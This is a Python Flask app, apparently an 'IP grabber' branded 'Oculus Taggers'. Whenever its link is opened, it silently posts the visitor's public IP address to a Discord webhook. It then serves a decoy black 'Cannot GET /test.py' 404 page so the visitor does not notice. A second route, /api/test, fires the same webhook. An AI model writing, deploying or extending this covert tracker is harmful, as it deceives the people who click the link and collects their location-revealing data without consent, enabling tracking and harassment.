import os
import json
import urllib.request
from flask import Flask, request

app = Flask(__name__)

WEBHOOK_URL = os.environ.get("ATTESTATION_WEBHOOK_URL")


def get_public_ip():
    # Vercel's forwarded header contains the visitor's public IP.
    forwarded_for = request.headers.get("X-Forwarded-For")

    if forwarded_for:
        return forwarded_for.split(",")[0].strip()

    return "Unknown"


def send_webhook(public_ip):
    if not WEBHOOK_URL:
        print("ERROR: ATTESTATION_WEBHOOK_URL is not set")
        return False

    payload = {
        "username": "Oculus Taggers",
        "embeds": [
            {
                "title": "Link Opened",
                "description": "Someone opened the Oculus Taggers link.",
                "fields": [
                    {
                        "name": "Public IP Address",
                        "value": f"`{public_ip}`",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Oculus Taggers"
                }
            }
        ]
    }

    data = json.dumps(payload).encode("utf-8")

    req = urllib.request.Request(
        WEBHOOK_URL,
        data=data,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "OculusTaggers/1.0"
        },
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            print("Discord response:", response.status)
            return 200 <= response.status < 300

    except Exception as error:
        print("Discord webhook error:", str(error))
        return False


@app.route("/")
def home():
    public_ip = get_public_ip()
    send_webhook(public_ip)

    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cannot GET</title>

        <style>
            html, body {
                margin: 0;
                padding: 0;
                width: 100%;
                height: 100%;
                overflow: hidden;
            }

            body {
                background: #000000;
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: Arial, sans-serif;
            }

            .message {
                color: white;
                font-size: 32px;
                font-weight: bold;
            }
        </style>
    </head>

    <body>
        <div class="message">Cannot GET /test.py</div>
    </body>
    </html>
    """, 404


@app.route("/api/test")
def test():
    public_ip = get_public_ip()
    success = send_webhook(public_ip)

    return {
        "ok": success,
        "public_ip": public_ip,
        "message": "Webhook sent" if success else "Webhook failed"
    }
